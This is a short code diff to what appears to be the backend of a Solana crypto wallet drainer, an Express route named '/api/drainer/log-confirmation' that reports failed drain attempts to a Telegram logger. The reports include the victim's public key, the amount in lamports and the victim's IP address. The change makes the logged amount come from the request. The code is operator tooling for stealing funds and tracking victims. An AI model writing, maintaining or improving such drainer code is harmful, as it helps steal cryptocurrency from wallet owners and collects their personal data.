@@ -115,7 +115,7 @@ app.post('/api/drainer/log-confirmation', async (req, res) => {
       console.log('[CONFIRMATION] Logging failed confirmation for:', publicKey, txid, error);
       await telegramLogger.logDrainFailed({
         publicKey: publicKey,
-        lamports: 0,
+        lamports: req.body.lamports || 0,
         ip: userIp,
         error: error || 'Transaction failed on-chain'
       });
